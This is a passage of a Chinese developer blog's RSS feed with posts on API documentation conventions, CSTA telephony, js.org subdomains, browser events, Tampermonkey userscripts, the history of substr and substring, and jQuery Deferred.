      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://p394yuy0c.bkt.clouddn.com/20180128223141_GeUnII_Jietu20180128-223059.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-http携带信息的方式&#34;&gt;1. HTTP携带信息的方式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;url&lt;/li&gt;
&lt;li&gt;headers&lt;/li&gt;
&lt;li&gt;body: 包括请求体，响应体&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-分离通用信息&#34;&gt;2. 分离通用信息&lt;/h1&gt;
&lt;p&gt;一般来说，headers里的信息都是通用的，可以提前说明，作为默认参数&lt;/p&gt;
&lt;h1 id=&#34;3-路径中的参数表达式&#34;&gt;3. 路径中的参数表达式&lt;/h1&gt;
&lt;p&gt;URL中参数表达式使用&lt;code&gt;{}&lt;/code&gt;的形式，参数包裹在大括号之中&lt;code&gt;{paramName}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/api/user/{userId}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/api/user/{userType}?age={age}&amp;amp;gender={gender}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;4-数据模型定义&#34;&gt;4. 数据模型定义&lt;/h1&gt;
&lt;p&gt;数据模型定义包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;路径与查询字符串参数模型&lt;/li&gt;
&lt;li&gt;请求体参数模型&lt;/li&gt;
&lt;li&gt;响应体参数模型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数据模型的最小数据集：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;名称&lt;/li&gt;
&lt;li&gt;是否必须&lt;/li&gt;
&lt;li&gt;说明&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;“最小数据集”（MDS）是指通过收集最少的数据，较好地掌握一个研究对象所具有的特点或一件事情、一份工作所处的状态，其核心是针对被观察的对象建立起一套精简实用的数据指标。最小数据集的概念起源于美国的医疗领域。最小数据集的产生源于信息交换的需要，就好比上下级质量技术监督部门之间、企业与质量技术监督部门之间、质量技术监督部门与社会公众之间都存在着信息交换的需求。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;一些文档里可能会加入字段的类型，但是我认为这是没必要的。以为HTTP传输的数据往往都需要序列化，大部分数据类型都是字符串。一些特殊的类型，例如枚举类型的字符串，可以在说明里描述。&lt;/p&gt;
&lt;p&gt;另外：&lt;code&gt;数据模型非常建议使用表格来表现&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;举个栗子🌰：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;名称&lt;/th&gt;
          &lt;th&gt;是否必须&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;userType&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
          &lt;td&gt;用户类型。&lt;code&gt;commom&lt;/code&gt;表示普通用户，&lt;code&gt;vip&lt;/code&gt;表示vip用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;age&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
          &lt;td&gt;用户年龄&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;gender&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
          &lt;td&gt;用户性别。&lt;code&gt;1&lt;/code&gt;表示男，&lt;code&gt;0&lt;/code&gt;表示女&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;5-请求示例&#34;&gt;5. 请求示例&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// general 
POST http://www.testapi.com/api/user

// request payload
{
	&amp;#34;name&amp;#34;: &amp;#34;qianxun&amp;#34;,
	&amp;#34;age&amp;#34;: 14,
	&amp;#34;like&amp;#34;: [&amp;#34;music&amp;#34;, &amp;#34;reading&amp;#34;],
	&amp;#34;userType&amp;#34;: &amp;#34;vip&amp;#34;
}

// response
{
	&amp;#34;id&amp;#34;: &amp;#34;asdkfjalsdkf&amp;#34;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;6-异常处理&#34;&gt;6. 异常处理&lt;/h1&gt;
&lt;p&gt;异常处理最小数据集&lt;/p&gt;</description>
    </item>
    <item>
      <title>win7 ie11 开发者工具打开后一片空白</title>
      <link>https://wdd.js.org/posts/2018/01/ie11-without-devtool/</link>
      <pubDate>Mon, 29 Jan 2018 21:43:12 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/ie11-without-devtool/</guid>
      <description>&lt;p&gt;解决方法安装Windows7补丁：KB3008923；
下载地址：
&lt;a href=&#34;http://www.microsoft.com/en-us/download/details.aspx?id=45134&#34;&gt;http://www.microsoft.com/en-us/download/details.aspx?id=45134&lt;/a&gt; （32位）
&lt;a href=&#34;http://www.microsoft.com/zh-CN/download/details.aspx?id=45154&#34;&gt;http://www.microsoft.com/zh-CN/download/details.aspx?id=45154&lt;/a&gt; （64位）&lt;/p&gt;</description>
    </item>
    <item>
      <title>CSTA 呼叫模型简介</title>
      <link>https://wdd.js.org/posts/2018/01/csta-call-model-overview/</link>
      <pubDate>Mon, 29 Jan 2018 21:35:24 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/csta-call-model-overview/</guid>
      <description>&lt;h1 id=&#34;1-内容概要&#34;&gt;1. 内容概要&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;CSTA协议与标准概述&lt;/li&gt;
&lt;li&gt;CSTA OpenScape 语音架构概述&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-csta协议标准&#34;&gt;2. CSTA协议标准&lt;/h1&gt;
&lt;h2 id=&#34;21-什么是csta-&#34;&gt;2.1. 什么是CSTA ?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;CSTA：电脑支持通讯程序(Computer Supported TelecommunicationsApplications)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基本的呼叫模型在1992建立，后来随着行业发展，呼叫模型也被加强和扩展，例如新的协议等等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSTA是一个应用层接口，用来监控呼叫，设备和网络&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSTA创建了一个通讯程序的抽象层:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSTA并不依赖任何底层的信令协议
&lt;ul&gt;
&lt;li&gt;E.g.H.323,SIP,Analog,T1,ISDN,etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CSTA并不要求用户必须使用某些设备
&lt;ul&gt;
&lt;li&gt;E.g.intelligentendpoints,low-function/stimulusdevices,SIPSignalingmodels-3PCC vs. Peer/Peer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;适用不同的操作模式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第三方呼叫控制&lt;/li&gt;
&lt;li&gt;一方呼叫控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSTA的设计目标是为了提高各种CSTA实现之间的移植性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;规范化呼叫模型和行为&lt;/li&gt;
&lt;li&gt;完成服务、事件定义&lt;/li&gt;
&lt;li&gt;规范化标准&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-csta-标准的进化史&#34;&gt;3. CSTA 标准的进化史&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;阶段1 (发布于 June ’92)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;40 特性, 66 页 (服务定义)&lt;/li&gt;
&lt;li&gt;专注于呼叫控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;阶段2 (发布于 Dec. ’94)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;77 特性, 145 页 (服务定义)&lt;/li&gt;
&lt;li&gt;I/O &amp;amp; 语音单元服务, 更多呼叫控制服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;阶段3 - CSTA Phase II Features &amp;amp; versit CTI Technology&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发布于 Dec. ‘98&lt;/li&gt;
&lt;li&gt;136 特性, 650 页 (服务定义)&lt;/li&gt;
&lt;li&gt;作为ISO 标准发布于 July 2000&lt;/li&gt;
&lt;li&gt;发布 CSTA XML (ECMA-323) June 2004&lt;/li&gt;
&lt;li&gt;发布 “Using CSTA with Voice Browsers” (TR/85) Dec. 02&lt;/li&gt;
&lt;li&gt;发布 CSTA WSDL (ECMA-348) June 2004&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;June 2004: 发布对象模型 TR/88&lt;/p&gt;</description>
    </item>
    <item>
      <title>组织在召唤：如何免费获取一个js.org的二级域名</title>
      <link>https://wdd.js.org/posts/2018/01/how-to-get-jsorg-sub-domain/</link>
      <pubDate>Mon, 29 Jan 2018 18:08:03 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/how-to-get-jsorg-sub-domain/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;之前我是使用wangduanduan.github.io作为我的博客地址，后来觉得麻烦，有把博客关了。最近有想去折腾折腾。
先看效果：&lt;a href=&#34;https://wdd.js.org&#34;&gt;wdd.js.org&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;如果你不了解js.org可以看看我的这篇文章:&lt;a href=&#34;https://segmentfault.com/a/1190000008342301&#34;&gt;一个值得所有前端开发者关注的网站js.org&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129182103_Avcxhn_Jietu20180129-182047.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-前提&#34;&gt;1. 前提&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;已经有了github pages的一个博客，并且博客中有内容，没有内容会审核不通过的。我第一次申请域名，就是因为内容太少而审核不通过。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-想好自己要什么域名&#34;&gt;2. 想好自己要什么域名？&lt;/h1&gt;
&lt;p&gt;比如你想要一个：wdd.js.org的域名，你先在浏览器里访问这个地址，看看有没有人用过，如果已经有人用过，那么你就只能想点其他的域名了。&lt;/p&gt;
&lt;h1 id=&#34;3-fork-jsorg的项目添加自己的域名&#34;&gt;3. fork js.org的项目，添加自己的域名&lt;/h1&gt;
&lt;p&gt;1 fork &lt;a href=&#34;https://github.com/js-org/dns.js.org&#34;&gt;https://github.com/js-org/dns.js.org&lt;/a&gt;
2 修改你fork后的仓库中的&lt;code&gt;cnames_active.js&lt;/code&gt;文件，加上自己的一条域名，最好要按照字母顺序&lt;/p&gt;
&lt;p&gt;如下图所示，我在第1100行加入。注意，不要在该行后加任何注释。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;wdd&amp;#34;: &amp;#34;wangduanduan.github.io&amp;#34;,
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129182555_tx71OV_Jietu20180129-182542.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;3 commit&lt;/p&gt;
&lt;h1 id=&#34;4-加入cname文件&#34;&gt;4. 加入CNAME文件&lt;/h1&gt;
&lt;p&gt;我是用hexo和next主题作为博客的模板。其中我在&lt;code&gt;gh-pages&lt;/code&gt;分支写博客，然后部署到&lt;code&gt;master&lt;/code&gt;分支。&lt;/p&gt;
&lt;p&gt;我在我的&lt;code&gt;gh-pages&lt;/code&gt;分支的&lt;code&gt;source&lt;/code&gt;目录下加入CNAME文件, 内容只有一行&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wdd.js.org
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129183216_aPl2ld_Jietu20180129-183209.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;将博客再次部署好，&lt;code&gt;如果CNAME生效的话，你已经无法从原来的地址访问：wangduanduan.github.io， 这个博客了。&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-向jsorg项目发起pull-request&#34;&gt;5. 向js.org项目发起pull-request&lt;/h1&gt;
&lt;p&gt;找到你fork后的项目，点击 &lt;code&gt;new pull request&lt;/code&gt;, 向原来的项目发起请求。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129190011_xvkHec_Jietu20180129-185938.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后你可以在&lt;code&gt;js-org/dns.js.org&lt;/code&gt;项目的pull requests看到你的请求，当这个请求被合并时，你就拥有了js.org的二级域名。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129190308_0cZZwM_Jietu20180129-190255.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129190454_9BnL7F_Jietu20180129-190449.jpeg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>不常用却很有妙用的事件及方法</title>
      <link>https://wdd.js.org/posts/2018/01/browser-events/</link>
      <pubDate>Mon, 29 Jan 2018 14:15:25 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/browser-events/</guid>
      <description>&lt;h1 id=&#34;1-visibilitychange事件httpsdevelopermozillaorgzh-cndocswebeventsvisibilitychange&#34;&gt;1. &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/Events/visibilitychange&#34;&gt;visibilitychange事件&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;触发条件：&lt;code&gt;浏览器标签页被隐藏或显示的时候会触发visibilitychange事件.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用场景：&lt;code&gt;当标签页显示或者隐藏时，触发一些业务逻辑&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;document.addEventListener(&amp;#34;visibilitychange&amp;#34;, function() {
  console.log( document.visibilityState );
});
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-storage事件httpsdevelopermozillaorgen-usdocswebeventsstorage&#34;&gt;2. &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/Events/storage&#34;&gt;storage事件&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;触发条件：&lt;code&gt;使用localStorage or sessionStorage存储或者修改某个本地存储时&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用场景：&lt;code&gt;标签页间通信&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// AB页面同源
// 在A 页面
window.addEventListener(&amp;#39;storage&amp;#39;, (e) =&amp;gt; {console.log(e)})

// 在B 页面，向120打个电话
localStorage.setItem(&amp;#39;makeCall&amp;#39;,&amp;#39;120&amp;#39;)

// 然后可以在A页面间有输出, 可以看出A页面 收到了B页面的通知
...key: &amp;#34;makeCall&amp;#34;, oldValue: &amp;#34;119&amp;#34;, newValue: &amp;#34;120&amp;#34;, ...
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-beforeunload事件httpsdevelopermozillaorgen-usdocswebeventsbeforeunload&#34;&gt;3. &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/Events/beforeunload&#34;&gt;beforeunload事件&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;触发条件：&lt;code&gt;当页面的资源将要卸载(及刷新或者关闭标签页前). 当页面依然可见，并且该事件可以被取消只时&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用场景：&lt;code&gt;关闭或者刷新页面时弹窗确认&lt;/code&gt;，&lt;code&gt;关闭页面时向后端发送报告等&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;window.addEventListener(&amp;#34;beforeunload&amp;#34;, function (e) {
  var confirmationMessage = &amp;#34;\o/&amp;#34;;

  e.returnValue = confirmationMessage;     // Gecko, Trident, Chrome 34+
  return confirmationMessage;              // Gecko, WebKit, Chrome &amp;lt;34
});
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;4-navigatorsendbeaconhttpsdevelopermozillaorgzh-cndocswebapinavigatorsendbeacon&#34;&gt;4. &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator/sendBeacon&#34;&gt;navigator.sendBeacon&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;这个方法主要用于满足 统计和诊断代码 的需要，这些代码通常尝试在卸载（unload）文档之前向web服务器发送数据。过早的发送数据可能导致错过收集数据的机会。然而， 对于开发者来说保证在文档卸载期间发送数据一直是一个困难。因为用户代理通常会忽略在卸载事件处理器中产生的异步 XMLHttpRequest 。&lt;/p&gt;</description>
    </item>
    <item>
      <title>油猴子脚本 - 我的地盘我做主</title>
      <link>https://wdd.js.org/posts/2018/01/tampermonkey/</link>
      <pubDate>Mon, 29 Jan 2018 13:58:37 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/tampermonkey/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;当你用浏览器访问某个网页时，你可曾想过，你看到的这个网页，实际上是属于你自己的。&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;打个比喻：&lt;code&gt;访问某个网站就好像是网购了一筐鸡蛋，鸡蛋虽然是养鸡场生产的，但是这个蛋我怎么吃，你养鸡场管不着&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当然了，对于很多人来说，鸡蛋没有别的吃法，鸡蛋只能煮着吃。&lt;/p&gt;
&lt;p&gt;你可以看如下的页面：当你在某搜索引擎上搜索&lt;code&gt;前端开发&lt;/code&gt;时&lt;/p&gt;
&lt;p&gt;大多数人看到的页面是这样的, &lt;code&gt;满屏的广告，满屏的推广，满屏的排名，满屏的中间地址跳转，满屏的流量劫持, 还有莆田系&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129135930_Btkbuq_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是有些人的页面却是这样的：&lt;code&gt;清晰，自然，链接直达，清水出芙蓉，天然去雕饰&lt;/code&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129135945_rkPKMY_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;这就是&lt;code&gt;油猴子脚本干的事情&lt;/code&gt;， 当然，它能干的事情，远不止如此。&lt;code&gt;它是齐天大圣孙悟空，有七十二变。&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-什么是油猴子脚本&#34;&gt;1. 什么是油猴子脚本？&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Greasemonkey，简称GM，中文俗称为“油猴”，是Firefox的一个附加组件。它让用户安装一些脚本使大部分HTML为主的网页于用户端直接改变得更方便易用。随着Greasemonkey脚本常驻于浏览器，每次随着目的网页打开而自动做修改，使得运行脚本的用户印象深刻地享受其固定便利性。&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Greasemonkey可替网页加入些新功能（例如在亚马逊书店嵌入商品比价功能）、修正网页错误、组合来自不同网页的数据、或者数繁不及备载的其他功能。写的好的Greasemonkey脚本甚至可让其输出与被修改的页面集成得天衣无缝，像是原本网页里的一部分。 来自&lt;a href=&#34;https://zh.wikipedia.org/wiki/Greasemonkey&#34;&gt;维基百科&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;2-如何安装油猴子插件&#34;&gt;2. 如何安装油猴子插件？&lt;/h1&gt;
&lt;p&gt;在google商店搜索&lt;code&gt;Tampermonkey&lt;/code&gt;, 安装量最高的就是它。&lt;/p&gt;
&lt;h1 id=&#34;3-如何写油猴子脚本&#34;&gt;3. 如何写油猴子脚本？&lt;/h1&gt;
&lt;p&gt;油猴子脚本有个新建脚本页面，在此页面可以创建脚本。具体教程可以参考。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://jixunmoe.github.io/gmDevBook/#/doc/intro/about&#34;&gt;中文 GreaseMonkey 用户脚本开发手册&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.leanote.com/post/mynote/%E6%B2%B9%E7%8C%B4%E5%AD%90&#34;&gt;GreaseMonkey（油猴子）脚本开发&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://e.sebug.net/paper/books/greasemonkey/&#34;&gt;深入浅出 Greasemonkey&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://commons.oreilly.com/wiki/index.php/Greasemonkey_Hacks/Getting_Started&#34;&gt;Greasemonkey Hacks/Getting Started&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129140004_amXldp_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-如何使用他人的脚本&#34;&gt;4. 如何使用他人的脚本？&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://greasyfork.org/zh-CN&#34;&gt;greasyfork网站&lt;/a&gt;提供很多脚本，它仿佛是代码界的github, 可以在该网站搜到很多有意思的脚本。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129140017_AapqKj_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-有哪些好用的脚本&#34;&gt;5. 有哪些好用的脚本？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zhihu.com/question/22210090&#34;&gt;有哪些超神的油猴脚本?&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;或者你可以在greasyfork网站查看一些下载量排行&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>追本溯源：substr与substring历史漫话</title>
      <link>https://wdd.js.org/posts/2018/01/substr-and-substring-history/</link>
      <pubDate>Mon, 29 Jan 2018 13:46:31 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/substr-and-substring-history/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;引子： 很多时候，当我要字符串截取时，我会想到substr和substring的方法，但是具体要怎么传参数时，我总是记不住。哪个应该传个字符串长度，哪个又应该传个开始和结尾的下标，如果我不去查查这两个函数，我始终不敢去使用它们。所以我总是觉得，这个两个方法名起的真是蹩脚。然而事实是这样的吗？&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;看来是时候扒一扒这两个方法的历史了。&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-基因追本溯源&#34;&gt;1. 基因追本溯源&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129134826_f2U0eJ_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;在编程语言的历史长河中，曾经出现过很多编程语言。然而大浪淘沙，铅华洗尽之后，很多早已折戟沉沙，有些却依旧光彩夺目。那么stubstr与substring的DNA究竟来自何处？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129134917_jJiHDy_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1950与1960年代&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;1954 - FORTRAN&lt;/li&gt;
&lt;li&gt;1958 - LISP&lt;/li&gt;
&lt;li&gt;1959 - COBOL&lt;/li&gt;
&lt;li&gt;1964 - BASIC&lt;/li&gt;
&lt;li&gt;1970 - Pascal&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;1967-1978：确立了基础范式&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;1972 - &lt;code&gt;C语言&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;1975 - Scheme&lt;/li&gt;
&lt;li&gt;1978 - SQL (起先只是一种查询语言，扩充之后也具备了程序结构)&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;1980年代：增强、模块、性能&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;1983 - &lt;code&gt;C++ (就像有类别的C)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;1988 - Tcl&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;1990年代：互联网时代&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;1991 - &lt;code&gt;Python&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;1991 - Visual Basic&lt;/li&gt;
&lt;li&gt;1993 - &lt;code&gt;Ruby&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;1995 - &lt;code&gt;Java&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;1995 - Delphi (Object Pascal)&lt;/li&gt;
&lt;li&gt;1995 - &lt;code&gt;JavaScript&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;1995 - &lt;code&gt;PHP&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;2009 - &lt;code&gt;Go&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;2014 - &lt;code&gt;Swift (编程语言)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;11-在c中首次出现substr&#34;&gt;1.1. 在C++中首次出现substr()&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180129135004_rX3T5Y_Screenshot.jpeg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>熟练使用使用jQuery Promise (Deferred)</title>
      <link>https://wdd.js.org/posts/2018/01/jquery-deferred/</link>
      <pubDate>Mon, 29 Jan 2018 13:43:23 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/jquery-deferred/</guid>
      <description>&lt;h1 id=&#34;1-情景再现&#34;&gt;1. 情景再现&lt;/h1&gt;
&lt;p&gt;以前用nodejs写后端程序时，遇到&lt;code&gt;Promise&lt;/code&gt;这个概念，这个东西好呀！不用谢一层一层回调，直接用类似于jQuery的连缀方式。后来遇到&lt;code&gt;bluebird&lt;/code&gt;这个库，它就是Promise库中很有名的。我希望可以把Promise用在前端的&lt;code&gt;ajax&lt;/code&gt;请求上，但是我不想又引入bluebird。后来发现，jquery本身就具有类似于Promise的东西。于是我就jquery的Promise写一些异步请求。&lt;/p&gt;
&lt;h1 id=&#34;2-不堪回首&#34;&gt;2. 不堪回首&lt;/h1&gt;
&lt;p&gt;看看一看我以前写异步请求的方式&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 函数定义
function sendRequest(req,successCallback,errorCallback){
    $.ajax({
        ...
        ...
        success:function(res){
            successCallback(res);
        },
        error:function(res){
            errorCallback(res);
        }
    });
}

// 函数调用,这个函数的匿名函数写的时候很容易出错，而且有时候难以理解
sendRequest(req,function(res){
    //请求成功
    ...
},function(res){
    //请求失败
    ...
});
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-面朝大海&#34;&gt;3. 面朝大海&lt;/h1&gt;
&lt;p&gt;下面是我希望的异步调用方式&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sendRequest(req)
.done(function(res){
    //请求成功
    ...
})
.fail(function(req){
    //请求失败
    ...
});
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;4-废话少说放码过来&#34;&gt;4. 废话少说，放‘码’过来&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;talk is cheap, show me the code&lt;/p&gt;&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 最底层的发送异步请求，做成Promise的形式

App.addMethod(&amp;#39;_sendRequest&amp;#39;,function(path,method,payload){
    var dfd = $.Deferred();
    $.ajax({
        url:path,
        type:method || &amp;#34;get&amp;#34;,
        headers:{
            sessionId:session.id || &amp;#39;&amp;#39;
        },
        data:JSON.stringify(payload),
        dataType:&amp;#34;json&amp;#34;,
        contentType : &amp;#39;application/json; charset=UTF-8&amp;#39;,
        success:function(data){
            dfd.resolve(data);
        },
        error:function(data){
            dfd.reject(data);
        }
    });
    return dfd.promise();
});

